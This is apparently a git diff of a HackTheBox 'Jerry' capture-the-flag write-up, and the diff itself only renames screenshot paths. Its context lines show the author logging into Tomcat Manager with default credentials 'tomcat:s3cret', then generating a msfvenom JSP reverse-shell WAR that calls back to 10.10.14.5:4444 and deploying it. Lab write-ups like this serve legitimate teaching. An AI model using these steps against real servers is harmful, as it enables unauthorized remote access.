@@ -9,7 +9,7 @@ tags:
 - war
 ---
 
-![Jerry](/Jerry.png)
+![Jerry](/htb-jerry.png)
 
 ## Scanning
 ### nmap
@@ -41,11 +41,11 @@ Only one port found, which is 8080 and looks to be an HTTP Apache Tomcat server,
 ## Enumeration
 ### Web Page
 Looks to be a default Apache Tomcat page:
-![Jerry](/jerry-apache_tomcat_page.png)
+![Jerry](/htb-jerry-apache_tomcat_page.png)
 Using one of the default credentials found, `tomcat:s3cret`, logging into the Manager App section of the website is easy.
-![Jerry](/jerry-apache_tomcat_manager.png)
+![Jerry](/htb-jerry-apache_tomcat_manager.png)
 Looking further down on the page, it looks like a WAR file can be uploaded and deployed to the server.
-![Jerry](/jerry-deploy_war_file.png)
+![Jerry](/htb-jerry-deploy_war_file.png)
 
 ## Exploitation
 Knowing that it takes a war file, a war file reverse shell can be created to upload and attempted to execute
@@ -56,9 +56,9 @@ Created the reverse shell war file using msfvenom
 kali@kali:~/ctf/htb/machines/jerry$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war > reverse.war
 ```
 Now to upload the war file.
-![Jerry](/jerry-deploy_war_file2.png)
+![Jerry](/htb-jerry-deploy_war_file2.png)
 After selecting the Deploy button it can now be seen in the Path column under Applications:
-![Jerry](/jerry-reverse_shell_path.png)
+![Jerry](/htb-jerry-reverse_shell_path.png)
 
 ### Reverse Shell
 Now to start a netcat listener to catch the reverse shell after executing it:
